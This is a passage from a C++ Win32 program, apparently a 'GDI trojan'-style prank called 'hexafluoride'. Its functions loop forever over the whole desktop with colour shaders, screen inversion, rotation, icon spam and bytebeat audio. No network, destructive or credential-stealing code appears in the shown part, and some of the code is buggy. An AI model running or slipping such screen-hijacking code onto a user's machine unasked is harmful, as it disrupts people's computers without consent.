		if (rand() % 10 == 5) RedrawWindow(0, 0, 0, 133);
	}
}

HRGN CreateHexagonRgn(int x, int y, int size) {
	POINT points[6];
	double angle = 2 * M_PI / 6;
	for (int i = 0; i < 6; i++) {
		points[i].x = x + (int)(size * cos(i * angle));
		points[i].y = y + (int)(size * sin(i * angle));
	}
	points[6] = points[0];
	return CreatePolygonRgn(points, 6, WINDING);
}

VOID WINAPI ci(int x, int y, int w, int h) {
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateHexagonRgn(x, y, w / 2);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x - w / 2, y - h / 2, w, h, hdc, x - w / 2, y - h / 2, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(0, hdc);
}

DWORD WINAPI wef(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500;
	int h = rect.bottom - rect.top - 500;
	for (int t = 0;; t++) {
		const int size = 1000;
		int x = rand() % (w + size) - size / 2;
		int y = rand() % (h + size) - size / 2;
		for (int i = 0; i < size; i += 100) {
			ci(x - i / 50, y - i / 50, i, i);
			Sleep(10);
		}
	}
}

DWORD WINAPI shader8(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h, t = y ^ y | x;
			data[i].rgb = (t & data[i].rgb % RGB(255, 255, 255) ^ x | y);
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader9(LPVOID lpParam) { //credits to camellia-y7x
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	float colorShift = 114.5;
	float colorIntensity = 0.14;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int a = x * i & i, b = i * y - i;
				int fx = (int)((i ^ 3) + (i * 6) * sin((a + i) * (b - i)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(h) * colorIntensity, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 5) / 10.0f, 2.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 5) / 5.0f, 3.0f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
	}
}

DWORD WINAPI shader10(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 255;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 110)
				v = rand() % 32;
			((BYTE*)(data + i))[0] = ((BYTE*)(data + i + v))[0];
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader11(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int xmm = x * y ^ y & x;
			int ymm = x + y * y ^ x;
			rgbScreen[i].r *= xmm * ymm;
			rgbScreen[i].g *= xmm ^ ymm;
			rgbScreen[i].b *= xmm & ymm;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader12(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			double fractalX = (2.5f / w);
			double fractalY = (1.90f / h);
			double cx = x * fractalX - 2.f;
			double cy = y * fractalY - 0.95f;
			double zx = 0, zy = 0;
			int fx = 0;
			while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
				double fczx = zx * zx - zy * zy + cx;
				double fczy = 2 * zx * zy + cy;
				zx = fczx; zy = fczy;
				fx++;
				rgbScreen[i].r = fx;
				rgbScreen[i].rgb -= 666;
			}
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI moricons(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HINSTANCE lib = LoadLibraryA("moricons.dll");
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(lib, MAKEINTRESOURCE(rand() % 113)), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI shader13(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = x | y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader14(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h, t = y ^ y & x;
			data[i].rgb -= RGB(x, y, t);
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI patblt(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

POINT lpt[3];
RECT rect;

VOID WINAPI RotateScreen(HWND hWnd, HDC hDC, int w, int h, int power) {
	GetWindowRect(hWnd, &rect);
	lpt[0].x = rect.left + power; lpt[0].y = rect.top - power;
	lpt[1].x = rect.right + power; lpt[1].y = rect.top + power;
	lpt[2].x = rect.left - power; lpt[2].y = rect.bottom - power;
	PlgBlt(hDC, lpt, hDC, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
}

DWORD WINAPI rotate(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	int p = 0, v = 0;
	while (true) {
		v = rand() % 2;
		if (v == 0) p = -51;
		else p = 51;
		for (int i = 0; i < 4; i++) {
			HDC hdc = GetDC(0);
			HDC mdc = CreateCompatibleDC(hdc);
			HBITMAP hbit = CreateCompatibleBitmap(hdc, sw, sh);
			SelectObject(mdc, hbit);
			BitBlt(mdc, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
			RotateScreen(GetDesktopWindow(), mdc, sw, sh, p);
			BLENDFUNCTION blend = { AC_SRC_OVER, 0, 110, 0 };
			AlphaBlend(hdc, 0, 0, sw, sh, mdc, 0, 0, sw, sh, blend);
			ReleaseDC(0, hdc);
			DeleteDC(mdc); DeleteDC(hdc); DeleteObject(hbit);
		}
	}
}

DWORD WINAPI shader15(LPVOID lpParam) { //credits to camellia-y7x
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	INT i = 0;
	while (true) {
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x * h + y;
				FLOAT fx = (y + i * 6) ^ (x);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 220.f + y / h * .5f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
	}
	return 0;
}

DWORD WINAPI hell1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, rand() % 10, rand() % 10, w - 20, h - 20, hdc, 0, 0, w, h, NOTSRCERASE);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shell32(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HINSTANCE lib = LoadLibraryA("shell32.dll");
        DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(lib, MAKEINTRESOURCE(rand() % 2048)), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI shader16(LPVOID lpParam) { //credits to camellia-y7x, but with HSL
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y ^ x * screenHeight;
				int fx = (int)((i ^ 4) + ((4 - i)) + (i * 9) + ((i * 3))) * cbrt(y);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI mash(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, 0x1900AC010E);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader17(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (int t = 0; ; t *= 10) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (int i = 0; i < w; i++) {
			for (int j = 0; j < h; j++) {
				rgbScreen[i * j].rgb = RGB(i % 256, j % 256, t % 256);
			}
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader18(LPVOID lpParam) { //credits to camellia-y7x
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = x * screenHeight + y;
				int fx = (int)((i ^ 3) + (i * 6) * cbrt(x * i ^ i * y + x ^ i + y + i ^ i * x & y ^ i));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / screenHeight * .1f, 1.f);
				hslcolor.s = 2.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader19(LPVOID lpParam) { //credits to camellia-y7x
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hBitmap, w * h * 4, data);
		BYTE byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			int v = rand() % 50;
			((BYTE*)(data + i))[v * v] *= x * y;
		}
		SetBitmapBits(hBitmap, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
	}
	return 0;
}

DWORD WINAPI textout1(LPVOID lpParam) {
    int cx = 1, cy = 1;
    int x = 0, y = 0;
    for (int t = 0; ; t++) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        SetBkMode(hdc, 0);
        LPCSTR text = "hexafluoride";
        SetTextColor(hdc, Hue(239));
        HFONT hfnt = CreateFontA(43, 32, 20 * t, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, hfnt);
        TextOutA(hdc, x, y, text, strlen(text));
        DeleteObject(hfnt);
        if (y >= GetSystemMetrics(1)) {
            cy = -1;
        }
        if (x >= GetSystemMetrics(0)) {
            cx = -1;
        }
        if (y == 0) {
            cy = 1;
        }
        if (x == 0) {
            cx = 1;
        }
        x += cx * 10, y += cy * 10;
        ReleaseDC(0, hdc);
        DeleteObject(hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader20(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += (x + i) * (y + i);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader21(LPVOID lpParam) { //credits to camellia-y7x, but with HSL
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (int)((4 ^ i) + ((8 & i) * tan(x * 2)) + (12 * i));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI cubes(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        StretchBlt(hdc, -10, 10, x + 20, y - 20, hdc, 0, 0, x, y, SRCCOPY);
        StretchBlt(hdc, 10, -10, x - 20, y + 20, hdc, 0, 0, x, y, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI lines(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		LineTo(hdc, rand() % (0 - w), 0);
		LineTo(hdc, rand() % (0 - w), h);
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ -(t >> 5 & 1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t & 8192 ? 7 : 5) * (3 - (8 & t >> 9) + (4 & t >> 8)) | t >> 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() { //credits to camellia-y7x
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(12 * t * (t >> 14 ^ t >> 8 | t >> 2));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 43532 >> 9) * (t >> 5) | t >> (t & 4096 ? 3 : 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
